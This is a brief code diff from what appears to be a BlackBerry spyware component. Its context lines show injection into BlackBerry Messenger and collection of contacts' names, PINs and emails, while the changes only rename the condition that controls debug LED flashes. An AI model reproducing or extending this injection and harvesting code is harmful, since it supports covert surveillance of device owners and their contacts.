@@ -111,7 +111,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
             debug.warn("injectBBM:" + ex.toString());
             //#endif
 
-            if (Status.self().isDemo()) {
+            if (Status.self().wantLight()) {
                 Debug.ledFlash(Debug.COLOR_RED);
             }
         }
@@ -158,7 +158,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
             debug.info("BBM INJECTED!");
             //#endif
 
-            if (Status.self().isDemo()) {
+            if (Status.self().wantLight()) {
                 Debug.ledFlash(Debug.COLOR_GREEN);
             }
 
@@ -238,7 +238,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
 
                     users.put(user.toLowerCase(), new User(user, pin, email));
 
-                    if (Status.self().isDemo()) {
+                    if (Status.self().wantLight()) {
                         Debug.ledFlash(Debug.COLOR_ORANGE);
                     }
                 }
